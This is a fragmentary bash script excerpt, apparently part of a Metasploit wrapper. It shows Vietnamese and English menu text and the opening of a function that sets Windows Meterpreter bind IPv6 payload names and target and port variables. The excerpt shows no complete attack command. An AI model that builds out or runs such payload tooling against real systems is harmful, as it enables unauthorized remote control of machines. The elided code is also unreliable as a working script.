...
no="     Không "
cat << !
Các tùy chọn của tải trọng (windows/auto/meterpreter/bind_ipv6_tcp_uuid):
...
no="     no "
cat << !
Payload options (windows/auto/meterpreter/bind_ipv6_tcp_uuid):
...
function payload_run {
	paylo="windows/auto/meterpreter/bind_ipv6_tcp_uuid"
	paylo1="windows/meterpreter/bind_ipv6_tcp_uuid"
	paylo2="windows/x64/meterpreter/bind_ipv6_tcp_uuid"
	rhost=$rhost
	lport1=$lport1
	lport2=$lport2
	exitfunc=$exitfunc
